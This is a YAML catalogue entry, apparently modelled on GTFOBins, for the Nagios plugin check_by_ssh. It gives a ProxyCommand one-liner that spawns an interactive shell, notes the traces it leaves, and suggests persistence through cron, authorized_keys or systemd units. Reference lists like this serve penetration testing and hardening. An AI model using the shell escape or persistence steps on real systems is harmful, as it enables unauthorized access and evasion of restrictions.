---
name: check_by_ssh
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
  notes: The shell will only last 10 seconds.
references:
- https://gtfobins.github.io/gtfobins/check_by_ssh/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
